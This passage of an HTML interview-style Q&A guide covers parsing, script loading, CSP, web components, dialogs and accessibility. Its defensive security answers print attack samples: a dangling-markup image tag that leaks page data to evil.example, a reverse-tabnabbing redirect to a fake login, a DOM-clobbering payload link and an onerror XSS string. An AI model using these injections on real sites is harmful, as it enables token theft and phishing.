When the parser finds content in a place inside a table where it isn't allowed, like text or a `<div>` directly in `<table>`, it moves that content to just before the table. This is called foster parenting.

```html
<table>
  <div>Oops</div>
  <tr>
    <td>Cell</td>
  </tr>
</table>
```

The DOM becomes:

```html
<div>Oops</div>
<table>
  <tbody>
    <tr>
      <td>Cell</td>
    </tr>
  </tbody>
</table>
```

This explains bugs where content "jumps" out of a table, and it's one reason frameworks complain when you put a `<div>` straight inside `<tbody>` in a template.

### 303: How does the parser recover from unclosed or misnested tags?

The spec has rules for every error. Some examples:

- `<p>` is closed automatically when a block element like `<div>`, `<ul>` or another `<p>` starts.
- `<li>` is closed when another `<li>` starts.
- For misnested formatting like `<b><i>text</b></i>`, the "adoption agency algorithm" closes and reopens elements to build a valid tree.
- Unclosed elements are closed when their parent ends or at the end of the document.

```html
<b>bold <i>both</b> italic</i>
```

becomes roughly `<b>bold <i>both</i></b><i> italic</i>`. All browsers produce the same DOM because the algorithm is fully specified.

### 304: Which tags are optional in HTML?

The spec lets you leave out some start and end tags, and the parser adds them:

- `<html>`, `<head>`, `<body>` start and end tags (in most cases)
- `</p>`, `</li>`, `</dt>`, `</dd>`, `</option>`, `</tr>`, `</td>`, `</th>`
- `<tbody>` start tag, `</thead>`, `</tbody>`, `</tfoot>`

```html
<!DOCTYPE html>
<title>Minimal</title>
<p>First paragraph</p>
<p>Second paragraph</p>
<ul>
  <li>One</li>
  <li>Two</li>
</ul>
```

This is valid HTML. Google's style guide even recommended it once to save bytes. Most teams still write all tags, because it's clearer and tools like formatters and JSX expect it.

### 305: What is the preload scanner?

When the main parser is blocked by a script, the browser runs a second, lightweight parser over the rest of the HTML. It doesn't build the DOM. It only looks for resources like `<img src>`, `<link rel="stylesheet">`, `<script src>` and `srcset` and starts downloading them early.

This is one of the most important browser optimizations. It is the main reason that resources in plain HTML load faster than resources added by JavaScript.

### 306: What patterns defeat the preload scanner?

Anything the scanner can't see in the raw HTML:

- Images or scripts injected with JavaScript (client-side rendered apps).
- CSS `background-image` for important images.
- Fonts referenced in CSS (found only after the CSS loads).
- `loading="lazy"` on the LCP image (it waits for layout).
- `data-src` lazy-loading libraries that swap in the real `src` later.
- `@import` inside CSS files.
- Scripts loaded by other scripts.

Fixes include rendering the HTML on the server, using real `<img>` elements, or adding `<link rel="preload">` for resources the browser finds late.

### 307: Why is `document.write()` bad?

`document.write()` inserts text into the HTML parser while it's running. Problems:

- The parser can't move on until the written content is handled, which blocks rendering.
- If it writes a `<script src>`, the parser has to wait for that script too. Chrome blocks such scripts on slow connections.
- Called after the page loads, it erases the whole document.
- It doesn't work in XHTML, in deferred or async scripts, or in module scripts.

Use DOM methods like `append()`, `insertAdjacentHTML()` or `createElement()` instead.

### 308: How exactly does CSS block rendering and scripts?

- **Rendering**: the browser won't paint the page until all stylesheets in `<head>` (without a non-matching `media`) are loaded and parsed. A stylesheet added later in `<body>` blocks rendering of the content after it.
- **Scripts**: a classic script that comes after a stylesheet won't run until that stylesheet is loaded, because the script might read computed styles like `getComputedStyle()`.

So a slow CSS file followed by a sync script blocks both rendering and parsing. Deferred and module scripts run after parsing and also wait for pending stylesheets.

### 309: What is the `blocking="render"` attribute?

It lets you mark a script, style or link as render-blocking on purpose:

```html
<script blocking="render" async src="/critical-theme.js"></script>
<link rel="expect" href="#main-content" blocking="render" />
```

The browser won't paint until it's done. This is useful for things like A/B test scripts or theme setup that would otherwise cause a visible flash. It's supported in Chromium-based browsers. Use it carefully, since it delays first paint for everyone.

### 310: What is the critical rendering path?

It is the chain of steps from receiving the HTML to showing pixels:

1. Build the DOM from HTML.
2. Build the CSSOM from CSS.
3. Combine them into the render tree (only visible elements).
4. Layout: calculate positions and sizes.
5. Paint: fill in pixels for each layer.
6. Composite: put the layers together on the screen.

Anything that delays step 1 or 2 (big HTML, render-blocking CSS, parser-blocking scripts) delays the first paint. Optimizing it means making the critical resources fewer, smaller and earlier.

### 311: What is the difference between `DOMContentLoaded` and `load`?

- `DOMContentLoaded` fires when the HTML is fully parsed and all deferred and module scripts have run. Images, stylesheets (in most cases), iframes and async scripts may still be loading.
- `load` fires on `window` when everything is finished: images, stylesheets, iframes, fonts used so far and so on.

```js
document.addEventListener("DOMContentLoaded", () => initApp());
window.addEventListener("load", () => startNonCriticalWork());
```

With `defer` or `type="module"`, you usually don't need to listen for `DOMContentLoaded` at all, because the DOM is ready when your script runs.

### 312: In what order do module scripts and `async` scripts run?

- `<script type="module">`: deferred by default. They run in document order after parsing, together with classic `defer` scripts.
- `<script type="module" async>`: runs as soon as the module and all its imports have loaded, in any order.
- `<script async>`: runs as soon as it's downloaded, in any order.
- `<script defer>`: runs after parsing, in document order.

Inline module scripts are also deferred (unlike inline classic scripts, which run right away), and you can add `async` to inline modules.

### 313: What are import maps?

Import maps let you control how bare module specifiers like `import { x } from 'lodash-es'` are resolved in the browser, without a bundler:

```html
<script type="importmap">
  {
    "imports": {
      "lodash-es": "https://cdn.jsdelivr.net/npm/lodash-es@4.17.21/lodash.js",
      "app/": "/js/app/"
    }
  }
</script>
<script type="module">
  import { debounce } from "lodash-es";
  import { start } from "app/main.js";
</script>
```

The import map must come before the first module script that uses it. It also supports `scopes` for different versions in different parts of the app, and `integrity` for subresource integrity checks. Import maps are supported in all modern browsers.

### 314: What is Subresource Integrity (SRI)?

SRI lets the browser check that a file from a CDN hasn't been changed. You add a hash of the expected content:

```html
<script
  src="https://cdn.example.com/lib@3.2.1/lib.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"
></script>
```

If the file's hash doesn't match, the browser refuses to run it. This protects you if the CDN is hacked. It only works with files that never change, so always pin an exact version. Cross-origin files also need `crossorigin` so the browser can read the response.

### 315: What does the `crossorigin` attribute do?

It decides whether a cross-origin request is made in CORS mode, and whether credentials are sent:

- No attribute: no CORS. The resource loads, but your page can't read it (canvas gets tainted, script errors show only "Script error.").
- `crossorigin="anonymous"` (or just `crossorigin`): CORS request without cookies.
- `crossorigin="use-credentials"`: CORS request with cookies.

```html
<link
  rel="preload"
  href="https://fonts.example.com/inter.woff2"
  as="font"
  crossorigin
/>
<img src="https://img.example.com/photo.jpg" crossorigin alt="..." />
```

Fonts are always fetched with CORS, which is why font preloads need `crossorigin`. Without it, the preload doesn't match the real request and the font downloads twice.

### 316: What is a "tainted" canvas?

If you draw a cross-origin image on a `<canvas>` without CORS, the canvas becomes "tainted". You can still show it, but you can't read the pixels: `getImageData()`, `toDataURL()` and `toBlob()` throw a security error.

```html
<img
  id="photo"
  src="https://img.example.com/a.jpg"
  crossorigin="anonymous"
  alt=""
/>
```

To avoid it, load the image with `crossorigin="anonymous"` and make sure the server sends `Access-Control-Allow-Origin`. This rule stops pages from reading private images from other sites through a canvas.

### 317: How do nonces and hashes work with Content Security Policy?

A strict CSP blocks inline scripts. To allow specific ones, you can use:

**Nonce**: a random value that changes on every response:

```http
Content-Security-Policy: script-src 'nonce-r4nd0m123' 'strict-dynamic'
```

```html
<script nonce="r4nd0m123">
  initApp();
</script>
```

**Hash**: the SHA hash of the exact script content:

```http
Content-Security-Policy: script-src 'sha256-B2yPHKaXnvFWtRChIbabYmUBFZdVfKKXHbWtWidDVF8='
```

`'strict-dynamic'` lets scripts trusted by nonce or hash load other scripts. Inline event handlers like `onclick="..."` are still blocked, which is another reason to use `addEventListener`.

### 318: What is Trusted Types?

Trusted Types is a browser feature that helps prevent DOM-based XSS. When enforced with CSP, dangerous sinks like `innerHTML`, `outerHTML`, `document.write` and `script.src` refuse plain strings and only accept special typed objects created by a policy:

```http
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types app-sanitizer
```

```js
const policy = trustedTypes.createPolicy("app-sanitizer", {
  createHTML: (input) => DOMPurify.sanitize(input),
});
el.innerHTML = policy.createHTML(userInput);
```

All HTML injection then goes through a few policies you can review. It has been supported in Chromium-based browsers for a long time, and other browsers have been adding support recently, so check current support.

### 319: What are the common XSS injection points in HTML?

Data can be injected in different contexts, and each one needs different escaping:

- **Text content**: `<p>{data}</p>`. Escape `<` and `&`.
- **Attribute values**: `<input value="{data}">`. Escape quotes, and always quote attributes. Unquoted attributes can be broken with just a space.
- **URL attributes**: `<a href="{data}">`. Escaping isn't enough; `javascript:alert(1)` is still a valid URL. Allow only `http:`, `https:` and `mailto:` schemes.
- **Event handler attributes**: `onclick="{data}"`. Never put data here.
- **Inside `<script>`**: `var x = "{data}"`. A `</script>` in the data closes the tag. Serialize as JSON and escape `<`.
- **Inside `<style>` or `style` attributes**: can be used for data theft. Avoid.

Template engines and frameworks escape text and attributes, but not always URLs.

### 320: How do you safely render user-provided HTML?

1. Avoid it if you can. Use Markdown with a safe renderer, or plain text.
2. Sanitize with a well-maintained library like DOMPurify, with a strict allow list of tags and attributes.
3. Sanitize on the server too if you store it.
4. Render it in a sandboxed iframe (`sandbox` without `allow-same-origin`) or on a separate origin for the strongest isolation.
5. Add a strict CSP as defense in depth.

The newer Sanitizer API (`element.setHTML()`) adds built-in sanitizing to the browser. It is shipping in some browsers but not all yet, so check support before relying on it. Don't write your own sanitizer with regular expressions. HTML parsing is far too complex for that.

### 321: What is clickjacking and how do you prevent it?

Clickjacking is when an attacker loads your site in an invisible `<iframe>` on their page and tricks users into clicking buttons on your site, like "Delete account" or "Confirm payment".

You prevent it by telling the browser not to allow framing:

```http
Content-Security-Policy: frame-ancestors 'none'
X-Frame-Options: DENY
```

`frame-ancestors` is the modern way and lets you allow specific origins. `X-Frame-Options` is older but still useful for old browsers. Both must be HTTP headers; `frame-ancestors` is ignored in a `<meta>` CSP.

### 322: What are the risks of `sandbox="allow-scripts allow-same-origin"`?

With both flags, a same-origin framed page can run scripts **and** has its real origin. That means its script can reach into the parent through `parent.document`, remove the `sandbox` attribute from its own iframe and reload itself with no sandbox at all.

So for content served from your own origin, this combination is about as safe as no sandbox. Only use both flags when the framed content is on a different origin, or when you fully trust it. For user content, use `allow-scripts` without `allow-same-origin`, or host it on a separate domain.

### 323: What is reverse tabnabbing?

When page A opens page B in a new tab, page B gets a reference to page A via `window.opener`. Even across origins, B can do:

```js
window.opener.location = "https://evil.example/fake-login";
```

The user returns to the original tab and sees a fake login page that looks like site A. That is reverse tabnabbing.

Modern browsers apply `noopener` by default for `target="_blank"`, which fixes it. It can still happen with `window.open()` without `noopener`, or with `rel="opener"`. The `Cross-Origin-Opener-Policy: same-origin` header also cuts this link.

### 324: What is dangling markup injection?

It is an attack used when an attacker can inject HTML but scripts are blocked (for example by CSP). They inject an unclosed attribute:

```html
<img src="https://evil.example/log?data=
```

The browser treats everything after it, up to the next matching quote, as part of the URL. That could include a CSRF token or private data on the page. Then it sends it to the attacker as an image request.

Defenses: escape output properly, use a strict CSP with `img-src` limits, and Chromium blocks URLs that contain both a raw newline and `<`, which stops many of these attacks.

### 325: What is DOM clobbering?

HTML elements with `id` or `name` attributes create global variables and properties on `document`. An attacker who can inject harmless-looking HTML (no scripts) can use this to override variables your code depends on:

```html
<!-- injected -->
<a id="config" href="https://evil.example/payload.js"></a>
```

```js
// your code
const src = window.config?.scriptUrl || "/default.js"; // 'config' is now the <a> element
```

Defenses:

- Don't read globals that could be missing; declare them with `const`/`let`.
- Check types (`config instanceof Object`) before using values.
- Sanitize user HTML and remove `id` and `name` attributes (DOMPurify can do this).

### 326: How does HTML help protect forms against CSRF?

CSRF (cross-site request forgery) tricks a logged-in user's browser into submitting a form to your site from another site. HTML forms can be posted cross-origin with cookies, so they are the classic attack vector.

Protection:

- A secret CSRF token in a hidden input that the server checks:

```html
<form method="post" action="/transfer">
  <input type="hidden" name="csrf_token" value="8f3a1c..." />
  ...
</form>
```

- `SameSite=Lax` or `Strict` on session cookies (Lax is the default in most browsers).
- Checking the `Origin` or `Sec-Fetch-Site` header on the server.

Never use `GET` for actions that change data, because `GET` requests are also sent by images and links.

### 327: What is mixed content?

Mixed content is when an HTTPS page loads resources over plain HTTP:

```html
<script src="http://cdn.example.com/lib.js"></script>
<img src="http://example.com/photo.jpg" alt="" />
```

- Scripts, styles, iframes and fetch requests over HTTP are blocked.
- Images, audio and video are automatically upgraded to HTTPS by modern browsers, and blocked if the HTTPS version doesn't work.

Fix it by using HTTPS URLs everywhere. The CSP directive `upgrade-insecure-requests` can upgrade old hard-coded HTTP links automatically during a migration.

### 328: What is the default referrer policy and why does it matter?

The default is `strict-origin-when-cross-origin`:

- Same origin requests send the full URL.
- Cross-origin requests send only the origin (`https://example.com/`).
- HTTPS to HTTP requests send nothing.

Before this default (around 2020), browsers sent the full URL everywhere, which leaked paths and query strings like `?reset_token=...` or `/users/123/medical-records` to third parties. You can still make it stricter with the `Referrer-Policy` header, `<meta name="referrer">` or per element with `referrerpolicy`.

### 329: How do Permissions Policy and the iframe `allow` attribute work together?

The `Permissions-Policy` HTTP header sets which features your own page and its frames may use:

```http
Permissions-Policy: camera=(), microphone=(), geolocation=(self "https://maps.example.com")
```

The `allow` attribute on an `<iframe>` can then pass permissions to that frame, but only within what the parent itself is allowed. A frame can never get more than its parent.

So a page can turn off features it never uses (good for security and for stopping third-party scripts), and give specific features only to the frames that need them.

### 330: What is Declarative Shadow DOM?

It lets you create a shadow root in plain HTML with a `<template shadowrootmode>`, without JavaScript:

```html
<user-card>
  <template shadowrootmode="open">
    <style>
      :host {
        display: block;
        border: 1px solid #ccc;
        padding: 1rem;
      }
    </style>
    <slot name="name"></slot>
  </template>
  <span slot="name">Nino</span>
</user-card>
```

The parser attaches the shadow root while parsing. This makes server-side rendering of web components possible, so they show up with styles before any JavaScript runs. It's supported in all modern browsers. Note that `innerHTML` doesn't process it; you need `setHTMLUnsafe()` or `Document.parseHTMLUnsafe()` to parse it from a string.

### 331: What are form-associated custom elements?

They are custom elements that act like real form fields: they submit values, take part in validation, work with `<label>` and react to form reset and disable.

```js
class StarRating extends HTMLElement {
  static formAssociated = true;
  #internals = this.attachInternals();

  set value(v) {
    this.#internals.setFormValue(String(v));
    if (!v) {
      this.#internals.setValidity({ valueMissing: true }, "Pick a rating");
    } else {
      this.#internals.setValidity({});
    }
  }

  formResetCallback() {
    this.value = 0;
  }
  formDisabledCallback(disabled) {
    this.toggleAttribute("aria-disabled", disabled);
  }
}
customElements.define("star-rating", StarRating);
```

`ElementInternals` also lets you set ARIA defaults like `this.#internals.role = 'slider'` without adding attributes to the host.

### 332: What are the lifecycle callbacks of a custom element?

- `constructor()`: element created. Set up state; don't read attributes or children here.
- `connectedCallback()`: added to the document. Render, add listeners.
- `disconnectedCallback()`: removed from the document. Clean up listeners, timers, observers.
- `adoptedCallback()`: moved to a new document.
- `attributeChangedCallback(name, oldValue, newValue)`: one of the `observedAttributes` changed.
- `connectedMoveCallback()`: newer callback used when the element is moved with `moveBefore()`, so it can keep its state instead of a disconnect/connect.

```js
class TimeAgo extends HTMLElement {
  static observedAttributes = ["datetime"];
  attributeChangedCallback() {
    this.render();
  }
  connectedCallback() {
    this.render();
  }
  render() {
    /* ... */
  }
}
```

`connectedCallback` can run more than once if the element is moved, so make it safe to call again.

### 333: What are customized built-in elements and why aren't they used much?

They extend a built-in element instead of `HTMLElement`, and you use them with the `is` attribute:

```js
class FancyButton extends HTMLButtonElement {
  /* ... */
}
customElements.define("fancy-button", FancyButton, { extends: "button" });
```

```html
<button is="fancy-button">Click</button>
```

The idea is great: you keep all native behavior and accessibility. But Safari (WebKit) has said it won't implement them, so they don't work there without a polyfill. That's why most libraries use autonomous custom elements, wrapping a native element inside.

### 334: How do slots work in Shadow DOM?

Slots are placeholders in the shadow tree where the element's children (light DOM) are shown:

```html
<template id="card-tpl">
  <style>
    header {
      font-weight: bold;
    }
  </style>
  <header><slot name="title">Untitled</slot></header>
  <div><slot></slot></div>
</template>
```

```html
<my-card>
  <span slot="title">Hello</span>
  <p>This goes to the default slot.</p>
</my-card>
```

Children with a `slot` attribute go to the slot with that name; the rest go to the unnamed default slot. Content inside a `<slot>` is fallback content shown when nothing is assigned. Slotted elements stay in the light DOM, so page styles still apply to them, and the `slotchange` event fires when the assigned nodes change.

### 335: What accessibility problems does Shadow DOM cause?

ARIA references using `id` don't cross shadow boundaries. So `aria-labelledby`, `aria-describedby`, `aria-controls` and `<label for>` can't point from inside a shadow root to an element outside it, or the other way around.

Examples of what breaks:

- A `<label for="x">` in the page can't label an `<input id="x">` inside a component's shadow root.
- A combobox inside a shadow root can't use `aria-activedescendant` for options in the light DOM.

Workarounds: keep related elements in the same tree, use `ElementInternals` and form-associated elements, or use `ariaLabelledByElements` and similar element reference properties, which can point to elements in the light DOM. There are also proposals ("Reference Target") to solve this at the platform level.

### 336: What happens when the parser finds a custom element before it's defined?

It creates a plain `HTMLElement` in an "undefined" state. The element is in the DOM and its children are parsed normally, but it has no behavior yet. When `customElements.define()` runs later, the browser "upgrades" all existing instances: it runs the constructor and then `connectedCallback`.

You can style the waiting state and wait for definitions:

```css
user-card:not(:defined) {
  visibility: hidden;
}
```

```js
await customElements.whenDefined("user-card");
```

Properties set on an element before it upgrades end up as own properties on the instance and can hide the class setters, so well-written components check for that in `connectedCallback`.

### 337: What happens to a `<script>` inside a `<template>`?

`<template>` content is parsed into a separate document fragment that belongs to an inert document with no browsing context. Nothing inside is "live": scripts don't run, images don't load, media doesn't play, and custom elements aren't upgraded.

When you clone `template.content` and insert the clone into the page, the cloned `<script>` elements **do** run, because they were never executed before. This surprises people, since scripts added with `innerHTML` don't run.

```html
<template id="tpl">
  <p>Hello</p>
  <script>
    console.log("runs when the clone is inserted");
  </script>
</template>
<script>
  document.body.append(document.getElementById("tpl").content.cloneNode(true));
</script>
```

So treat template content like any other HTML you insert: never build templates from untrusted strings.

### 338: Do scripts inserted with `innerHTML` run?

No. `<script>` elements added with `innerHTML` (or `outerHTML`, `insertAdjacentHTML`) are not executed. This was decided for safety and consistency.

But this is **not** XSS protection. Event handler attributes still run:

```js
el.innerHTML = '<img src="x" onerror="alert(1)">'; // runs
el.innerHTML = "<script>alert(1)</script>"; // doesn't run
```

`Range.createContextualFragment()` and `document.createElement('script')` do produce scripts that run. So all HTML injection points are dangerous with untrusted data.

### 339: What is the performance difference between `innerHTML`, `createElement` and `DocumentFragment`?

- `innerHTML` with a big string is fast for building a lot of markup at once, because the browser's C++ parser does the work. It replaces all children, destroying their state and listeners, and it's unsafe with untrusted data.
- `createElement` plus `append` is more code, but safe and precise. Each insert into the live DOM can cause style recalculation if you read layout in between.
- `DocumentFragment` lets you build many nodes off-document and insert them in one operation.

```js
const frag = document.createDocumentFragment();
for (const item of items) {
  const li = document.createElement("li");
  li.textContent = item.name;
  frag.append(li);
}
list.append(frag);
```

The biggest performance problem usually isn't the method. It's mixing DOM writes with layout reads (`offsetHeight`, `getBoundingClientRect`) in a loop, which forces many layouts.

### 340: What are `setHTMLUnsafe()` and `Document.parseHTMLUnsafe()`?

They are newer methods to parse HTML strings, and unlike `innerHTML` and `DOMParser`, they understand declarative shadow DOM:

```js
host.setHTMLUnsafe(
  '<my-el><template shadowrootmode="open"><p>Hi</p></template></my-el>',
);
const doc = Document.parseHTMLUnsafe(htmlString);
```

The "Unsafe" in the name is there on purpose: they don't sanitize anything. They sit next to the safe versions from the Sanitizer API, `setHTML()` and `Document.parseHTML()`, which remove dangerous content. Only use the unsafe ones with HTML you trust.

### 341: What is the top layer?

The top layer is a special layer that the browser draws above everything else on the page, no matter the `z-index`, `overflow: hidden` or stacking contexts of the parents.

Elements go into the top layer when:

- A `<dialog>` is opened with `showModal()`.
- A popover is shown.
- An element goes fullscreen with `requestFullscreen()`.

Elements in the top layer are stacked in the order they were added. Each gets its own `::backdrop`. This solves the classic problem of modals and dropdowns being clipped or hidden behind other content.

### 342: How do popovers decide what to close (light dismiss and nesting)?

Auto popovers form a stack. When you open a new auto popover:

- If it's "nested" inside an open one, the parent stays open. Nesting is based on DOM ancestry, the invoking button being inside the parent popover, or `anchor` relationships.
- Otherwise, all other open auto popovers are closed.

Light dismiss (click outside or Esc) closes the top popover and any above it in the stack. Manual popovers are not part of this stack. This makes nested menus and submenus work without JavaScript, as long as the markup expresses the nesting.

### 343: How do you position a popover next to its button?

With CSS anchor positioning:

```html
<button popovertarget="tip" style="anchor-name: --help-btn">Help</button>
<div id="tip" popover style="position-anchor: --help-btn">Some help text</div>
```

```css
#tip {
  margin: 0;
  inset: auto;
  top: anchor(bottom);
  left: anchor(left);
  position-try-fallbacks: flip-block;
}
```

When a popover is opened by a button with `popovertarget`, the browser creates an implicit anchor reference, so in supporting browsers you often don't even need `anchor-name`. `position-try-fallbacks` flips the popover if it doesn't fit. Anchor positioning is supported in Chromium-based browsers and Safari. Check current Firefox support, or keep a JavaScript fallback like Floating UI.

### 344: What is `popover="hint"`?

`hint` is a third popover type for things like tooltips. A hint popover doesn't close open `auto` popovers when it shows. So you can show a tooltip for an item inside an open menu without closing the menu. Opening a hint does close other hints.

```html
<div id="tip" popover="hint">Copies the link</div>
```

It's newer and currently supported mainly in Chromium-based browsers. In other browsers, an unknown value falls back to `manual`. It's often used together with the proposed `interestfor` attribute for hover and focus triggers.

### 345: What are invoker commands (`commandfor` and `command`)?

They let a `<button>` control another element declaratively, without JavaScript:

```html
<button commandfor="confirm" command="show-modal">Delete</button>

<dialog id="confirm">
  <p>Are you sure?</p>
  <button commandfor="confirm" command="close">Cancel</button>
</dialog>

<button commandfor="menu" command="toggle-popover">Menu</button>
<div id="menu" popover>...</div>
```

Built-in commands include `show-modal`, `close` and `request-close` for dialogs, and `show-popover`, `hide-popover` and `toggle-popover` for popovers. You can also define custom commands starting with `--`, which fire a `command` event on the target. This is a newer feature that recently landed in all major browsers, so check support if you need older versions.

### 346: What does the `closedby` attribute on `<dialog>` do?

It controls how a dialog can be closed by the user:

- `any`: Esc, clicking the backdrop (light dismiss), or a close button/script.
- `closerequest`: Esc (and other platform close gestures), or explicit close. The default for modal dialogs.
- `none`: only by your code or buttons.

```html
<dialog closedby="any">Click outside to close me</dialog>
```

Before this, closing a modal on backdrop click needed JavaScript to compare click coordinates. It is a newer attribute and isn't in every browser yet, so keep a fallback if you need it everywhere.

### 347: How does focus work when a modal dialog opens and closes?

When you call `showModal()`:

- The browser focuses the first focusable element inside, or the element with `autofocus`, or the dialog itself if nothing is focusable.
- The rest of the page is inert, so Tab stays inside the dialog and the browser UI.

When the dialog closes, the browser moves focus back to the element that was focused before it opened (usually the button that opened it).

Best practices: put `autofocus` on the most sensible element (often the least destructive button, like "Cancel"), and for long dialogs, focus the heading so screen reader users start at the top.

### 348: How were accessible modals built before `<dialog>`, and what did they need?

A custom modal needed all of this:

- `role="dialog"` and `aria-modal="true"` on the container.
- `aria-labelledby` pointing to the title.
- Moving focus into the modal on open.
- A focus trap: catching Tab and Shift+Tab at the edges.
- Hiding the rest of the page from screen readers (`aria-hidden` or `inert` on siblings).
- Closing on Esc.
- Returning focus to the trigger on close.
- Stopping the background from scrolling.
- Portaling to `<body>` to avoid `z-index` and `overflow` problems.

`<dialog>` with `showModal()` handles almost all of this. You'll still see the old pattern in many component libraries.

### 349: What is the customizable `<select>`?

It is a newer feature that lets you fully style a native `<select>`, including the dropdown and options, and put rich content like images inside options:

```css
select,
::picker(select) {
  appearance: base-select;
}
```

```html
<select>
  <button><selectedcontent></selectedcontent></button>
  <option value="ge"><img src="ge.svg" alt="" /> Georgia</option>
  <option value="de"><img src="de.svg" alt="" /> Germany</option>
</select>
```

`<selectedcontent>` mirrors the chosen option into the button. The picker uses the top layer and anchor positioning. You keep native keyboard support, form submission and accessibility. It's currently supported in Chromium-based browsers; others fall back to a normal select, so it's safe to use as an enhancement.

### 350: When would you build a custom combobox, and what does it need?

Build one only if native elements can't do the job, like an async search with rich results. Try `<select>`, `<datalist>` and the customizable select first.

A custom combobox (following the ARIA APG pattern) needs:

- An `<input role="combobox">` with `aria-expanded`, `aria-controls` and `aria-autocomplete`.
- A popup with `role="listbox"` and options with `role="option"` and `aria-selected`.
- `aria-activedescendant` on the input pointing to the highlighted option, so focus stays in the input while arrow keys move through options.
- Keys: Down/Up to move, Enter to choose, Esc to close, Home/End.
- A live region announcing the number of results.
- A visible label.

It's a lot of work, which is why most teams use a tested library (like React Aria or Downshift).

### 351: What is roving tabindex?

It's a pattern for composite widgets like toolbars, tab lists, radio groups and grids, where the whole widget should be a single Tab stop and arrow keys move between items.

- The active item has `tabindex="0"`.
- All other items have `tabindex="-1"`.
- On arrow key press, you move `tabindex="0"` to the next item and call `.focus()` on it.

```html
<div role="toolbar" aria-label="Formatting">
  <button tabindex="0">Bold</button>
  <button tabindex="-1">Italic</button>
  <button tabindex="-1">Underline</button>
</div>
```

This way keyboard users don't have to Tab through every button, and when they come back to the widget, focus returns to the last active item.

### 352: What is `aria-activedescendant` and when do you use it instead of moving focus?

`aria-activedescendant` lets real focus stay on one element (like a text input) while telling screen readers which child is "active":

```html
<input
  role="combobox"
  aria-controls="list"
  aria-expanded="true"
  aria-activedescendant="opt-2"
/>
<ul id="list" role="listbox">
  <li id="opt-1" role="option">Apple</li>
  <li id="opt-2" role="option" aria-selected="true">Banana</li>
</ul>
```

Use it when focus must stay where it is, as in a combobox where the user keeps typing while arrowing through options. For toolbars and tabs, roving tabindex is usually simpler. With `aria-activedescendant`, you have to style the active option yourself and scroll it into view, since it doesn't really have focus.

### 353: What are common mistakes with live regions?

- Adding the live region to the DOM at the same time as the message. Most screen readers only watch regions that already exist.
- Using `aria-live="assertive"` or `role="alert"` for non-urgent messages, which interrupts the user.
- Announcing too often, like on every keystroke in a search field. Debounce it.
- Putting a lot of content in a live region, so it reads a long block.
- Using `display: none` on the region, which hides it from screen readers.
- Setting the same text twice. Some screen readers won't repeat it, so clear it first or add a small change.

A good pattern is one or two empty live regions in the app shell that a helper function writes messages into.

### 354: What is the accessibility tree?

The accessibility tree is a version of the DOM that the browser builds for assistive technology. Each node has a role, a name, a state (like checked or expanded), a value and sometimes a description.

It leaves out things that don't matter, like decorative `<div>` wrappers, `aria-hidden` content and `display: none` elements. Screen readers and other tools read this tree through the operating system's accessibility APIs, not the DOM directly.

You can see it in Chrome DevTools (Elements > Accessibility, or the full-page accessibility tree view) and in Firefox's Accessibility Inspector.

### 355: How does the browser compute an accessible name in detail?

The "Accessible Name and Description Computation" spec goes in steps, and the first one that gives a result wins:

1. If the element is hidden and not referenced, it gets no name.
2. `aria-labelledby`: the text of the referenced elements, in order (even if they are hidden).
3. `aria-label`, if it isn't empty.
4. Native host language label: `<label>`, `alt`, `<caption>`, `<legend>`, `<figcaption>`, `value` for submit buttons, `title` for `<svg>` and so on.
5. Name from content: for roles that allow it (button, link, heading, cell, option...), the text of all descendants, computed recursively.
6. Tooltip attribute: `title` or `placeholder`.

That's why `aria-label` on a link overrides its visible text, and why a `<div>` with `aria-label` but no role is often ignored: generic roles don't support naming.

### 356: What does `role="presentation"` or `role="none"` do?

It removes the element's own semantics, but keeps its content:

```html
<table role="presentation">
  <tr>
    <td>Layout cell</td>
  </tr>
</table>
```

The screen reader no longer announces a table, rows or cells, just the text. It is used for legacy layout tables or when a list structure is only visual.

The role is ignored if the element is focusable or has global ARIA attributes like `aria-label`, because removing its meaning would then be confusing. Also, for tables and lists, the required child elements (`<tr>`, `<td>`, `<li>`) automatically lose their semantics too.

### 357: Can CSS change the semantics of HTML?

In practice, yes, in some browsers:

- `display: contents` removed elements from the accessibility tree in older browser versions, so a `<button>` or `<ul>` with it could lose its role. Most of these bugs are fixed now, but test before using it on interactive or semantic elements.
- `list-style: none` on `<ul>`/`<ol>` makes Safari/VoiceOver drop list semantics (on purpose, to avoid "list" noise on nav menus). Add `role="list"` if the list matters.
- Changing `display` on table elements (to `block` or `grid`) can remove table semantics in some browsers. Add explicit ARIA table roles if you do that.
- `display: none` and `visibility: hidden` hide content from screen readers.
- CSS-generated content (`::before` content) is read by most screen readers.

### 358: How do you mark up a complex data table with multi-level headers?

When `scope` isn't enough, link each cell to all its headers with `id` and `headers`:

```html
<table>
  <caption>
    Quarterly sales by region
  </caption>
  <tr>
    <td></td>
    <th id="q1" colspan="2">Q1</th>
  </tr>
  <tr>
    <td></td>
    <th id="q1-online" headers="q1">Online</th>
    <th id="q1-store" headers="q1">Store</th>
  </tr>
  <tr>
    <th id="eu">Europe</th>
    <td headers="eu q1 q1-online">120</td>
    <td headers="eu q1 q1-store">80</td>
  </tr>
</table>
```

The screen reader can then read "Europe, Q1, Online, 120". If a table needs this, also consider splitting it into simpler tables, which is easier for everyone to read.

### 359: Which WCAG requirements are mostly handled in HTML?

WCAG 2.2 is the current version. Many of its success criteria are met mostly through good HTML:

- **1.1.1 Non-text content**: `alt` on images, labels on icons.
- **1.3.1 Info and relationships**: headings, lists, tables, labels, fieldsets, landmarks.
- **1.3.5 Identify input purpose**: `autocomplete` values.
- **2.1.1 Keyboard**: using native buttons, links and form controls.
- **2.4.1 Bypass blocks**: landmarks and skip links.
- **2.4.2 Page titled**: `<title>`.
- **2.4.4 Link purpose**: clear link text.
- **3.1.1 / 3.1.2 Language of page and parts**: `lang`.
- **3.3.2 Labels or instructions**: `<label>` and hints.
- **4.1.2 Name, role, value**: correct elements or ARIA for custom widgets.

Most legal requirements (like the European Accessibility Act) point to WCAG AA.

### 360: Why do screen readers behave differently, and how do you test across them?

Each screen reader works with a browser and the OS accessibility API, and they interpret the same markup in slightly different ways. Common combinations:

- NVDA + Chrome or Firefox (Windows)
- JAWS + Chrome (Windows, common in companies)
- VoiceOver + Safari (macOS and iOS)
- TalkBack + Chrome (Android)

Most screen readers on desktop have a "browse mode" for reading and a "focus/forms mode" for typing, and some ARIA roles switch between them. Test your most important flows (sign up, checkout, main navigation) with at least NVDA on Windows and VoiceOver on iOS, because those cover a large part of users.

